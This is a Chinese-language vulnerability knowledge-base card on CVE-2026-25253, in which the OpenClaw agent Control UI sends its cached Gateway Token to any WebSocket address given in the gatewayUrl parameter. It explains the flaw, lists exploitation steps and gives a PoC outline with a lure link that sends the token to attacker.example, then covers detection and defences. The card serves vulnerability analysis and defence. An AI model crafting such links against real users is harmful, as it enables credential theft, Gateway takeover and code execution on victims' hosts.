---
id: ai-security-agent-security-openclaw-control-ui-gatewayurl-token-leak-rce
title: OpenClaw Control UI 无条件信任 gatewayUrl：WebSocket 握手自动外带 Gateway Token 导致 Gateway 接管与宿主机 RCE（CVE-2026-25253）
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: agent-control-ui-gateway-url-token-websocket-exfiltration
tags:
- ai-security
- agent
- openclaw
- control-ui
- gateway
- websocket
- token-leak
- credential-exfiltration
- rce
- localhost
cve:
- CVE-2026-25253
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V159
  verified_at: '2026-11-06T07:37:11+08:00'
  notes: 已对照原文与13张截图核对：CVE-2026-25253的Control UI无条件信任URL参数gatewayUrl、向任意地址发起WebSocket并在握手自动附带本地缓存Gateway Token、Token泄露后接管Gateway并宿主机RCE的描述与原文/infographic一致。未验证点：原文仅为防御分析中的引用，无受影响版本区间、无实际PoC，卡片confidence medium且PoC标明未执行合理；原文未提供sources/source_url。未设置versions。
url: /docs/ai-security/agent-security/ai-security-agent-security-openclaw-control-ui-gatewayurl-token-leak-rce/
draft: false
kb_aliases:
- CVE-2026-25253
- OpenClaw gatewayUrl Token 窃取
- Control UI WebSocket Token 外带
- Gateway Token 接管
- OpenClaw Gateway RCE
- agent control UI credential leak
---

## 一句话结论

OpenClaw 的 Control UI 在加载时无条件信任 URL 查询参数 `gatewayUrl`，会向该参数指定的任意地址发起 WebSocket 连接，并在握手阶段自动附带本地缓存的 Gateway Token；攻击者诱导受害者打开一条带恶意 `gatewayUrl` 的链接，即可在自己的 WebSocket 服务端收到 Token，再用该 Token 完全控制 Gateway，最终在宿主机上执行任意代码（CVE-2026-25253，CVSS 8.8）。

## 原理

- **Control UI 是 Gateway 的本地管理面**：OpenClaw 的 Control UI 是浏览器里的管理界面，负责连接 Gateway 的 WebSocket 接口并调用管理能力；连接所需的 Gateway Token 由 UI 在本机缓存（如浏览器本地存储），后续连接时自动复用，避免用户反复输入。
- **地址来源与凭证去向分离**：Control UI 从 URL 查询参数 `gatewayUrl` 读取“要连哪个 Gateway”，但没有校验该地址是否为本机或受信端点；同时它在握手时无条件附带本机缓存的 Gateway Token，而不是只向默认的 `localhost`/官方端点发送凭证。于是“用户可控的连接目标”和“高价值本地凭证”在同一个动作里被拼到了一起。
- **WebSocket 不受同源策略保护**：浏览器对 WebSocket 握手不做 CORS 预检，页面可以把连接指向任意 `ws://`/`wss://` 地址；服务端只能看到握手中的 `Origin` 等字段，是否接受跨站连接完全取决于服务端校验。该漏洞中 Control UI 主动把连接发起权交给了 URL 参数，浏览器不会替用户拦截。
- **Token 即 Gateway 的完整权限凭证**：Gateway Token 是连接 Gateway WebSocket API 的认证凭据。拿到 Token 的攻击者可以像正常 Control UI 一样完成握手、调用 Gateway 的管理接口，控制连接该 Gateway 的平台账号，并通过 Gateway 的宿主执行能力落地命令，形成 RCE。
- **为什么是架构问题而非单纯提示词问题**：攻击不依赖让模型“相信”某段话，而是利用 UI 的信任边界错误——把本地缓存凭证发送给未校验的第三方地址。因此 prompt 层的 Safety 规则、工具审批等机制都拦不住这一步，必须先拿到 Token 才能进入后续链路。

## 触发条件

- 目标运行存在该缺陷的 OpenClaw 版本，Control UI 可被受害者浏览器打开，且本机已缓存 Gateway Token（通常用户登录/配对过 Control UI）。
- 攻击者能向受害者投递一条链接或诱导其访问可控页面，链接中的 `gatewayUrl` 指向攻击者控制的 WebSocket 端点。
- 受害者点击链接或在已打开 Control UI 的情况下被导航到该 URL。
- Gateway 的 WebSocket 端口对攻击者可达，或攻击者可借助已泄露 Token 通过其他可达路径访问 Gateway；若 Gateway 仅绑定 `127.0.0.1` 且攻击者无法到达，Token 泄露本身仍成立，RCE 还需额外的网络位置条件。
- 原文未给出精确受影响版本区间；文中提到该问题出现后安装默认将 Gateway（含 Control UI）绑定到 `127.0.0.1:18789`，可作为版本/配置侧的时间线参考，但不应据此猜测具体版本号。

## 利用步骤

1. 攻击者准备一个 WebSocket 服务端（如 `wss://attacker.example/ws`），用于接收并记录握手请求中的 Token。
2. 构造恶意链接，把 OpenClaw Control UI 的地址与 `gatewayUrl` 参数拼在一起，例如 `http://<victim>:18789/?gatewayUrl=wss://attacker.example/ws`；也可通过钓鱼页面、聊天消息或开放重定向投递。
3. 受害者打开链接后，Control UI 读取 `gatewayUrl`，向攻击者地址发起 WebSocket 连接，并在握手请求中自动附带本地缓存的 Gateway Token。
4. 攻击者从握手请求（请求头或 URL 参数，具体字段随版本而异）中提取 Token。
5. 攻击者用该 Token 连接目标 Gateway 的 WebSocket 接口，调用管理/执行类能力；原文结论是 Token 泄露即可完全控制 Gateway，进而控制其连接的各平台账号并在宿主机执行任意代码。
6. 若 Gateway 只监听回环地址，攻击者需先取得能访问该端口的网络位置（如受害主机上的其他入口、内网跳板或浏览器侧后续利用），否则只能停留在凭证窃取阶段。

## PoC

原文未给出可直接执行的完整 PoC，以下为按文中机制还原的最小验证思路（未执行，字段名与协议消息需按目标版本核对）：

```text
# 攻击者侧：启动一个记录握手请求的 WebSocket 服务
# 例如使用任意 WS 库监听 wss://attacker.example/ws，打印 upgrade 请求的 headers 与 query

# 投递给受害者的链接（Control UI 默认端口示例）
http://127.0.0.1:18789/?gatewayUrl=wss://attacker.example/ws
```

```text
验证要点（授权环境）：
1) 受害者浏览器已登录/配对过 Control UI，本地存在 Gateway Token；
2) 打开上述链接后，攻击者 WS 服务端应收到来自受害者浏览器的握手；
3) 检查握手请求中是否携带 Gateway Token（原文描述为“自动附带”，具体承载位置按版本确认）；
4) 用捕获的 Token 连接 Gateway WebSocket，验证可调用管理接口；不要在未授权环境执行。
```

## 变体与关联

- **参数变体**：`gatewayUrl` 之外，凡是允许从 URL/配置指定“上游/网关/BaseURL”并同时自动附带本地凭证的管理 UI，都可能复现同类“地址可控 + 凭证跟随”问题。
- **投递变体**：恶意链接、聊天消息、二维码、开放重定向、被攻陷的文档/网页均可作为入口；不要求受害者手动输入地址。
- **凭证形态变体**：浏览器 localStorage、IndexedDB、Cookie、桌面客户端配置文件中的 Token/API Key；只要 UI 在连接任意地址时自动带上，就等价于可被外带。
- **关联卡片**：[[ai-security-agent-security-llm-relay-baseurl-tool-call-hijack]]（BaseURL 劫持伪造 Tool Call）、[[web-generic-websocket-browser-tools-mcp-cswsh-osascript-rce]]（WebSocket 跨站劫持到本地 RCE）；前者是响应侧篡改，本卡是连接侧凭证外带。
- **边界**：若 Control UI 对 `gatewayUrl` 做 localhost/白名单校验、仅在默认端点附带 Token，或 Token 与目标地址绑定，则利用不成立；若 Gateway 强制回环且攻击者无法到达，危害降为凭证泄露。

## 检测与防御

- **地址校验**：Control UI 只接受默认/白名单内的 Gateway 地址，拒绝从 URL 参数切换到任意外部主机；跨源目标一律不附带本地凭证。
- **凭证绑定**：Token 与 Gateway 身份/端点绑定，连接非默认地址时要求重新配对；避免把长期 Token 存成可被任意页面读取的形式。
- **网络暴露面**：Gateway 与 Control UI 默认绑定 `127.0.0.1`，不监听公网；确需远程访问时走认证反向代理与最小权限。
- **浏览器侧**：用 CSP 的 `connect-src` 限制 WebSocket 目标域；管理 UI 与业务页面分离，避免把管理面嵌入可被外部导航的上下文。
- **检测**：监控浏览器/主机向未知域名发起的 WebSocket 连接；审计 Gateway 登录来源 IP 与配置变更；对异常 Token 使用（新 IP、非 UI 客户端、批量管理调用）告警。
- **响应**：确认 Token 泄露后立即轮换 Gateway Token、断开可疑会话、检查 Gateway 配置与宿主机命令历史，并排查同一 Token 是否被用于其他实例。
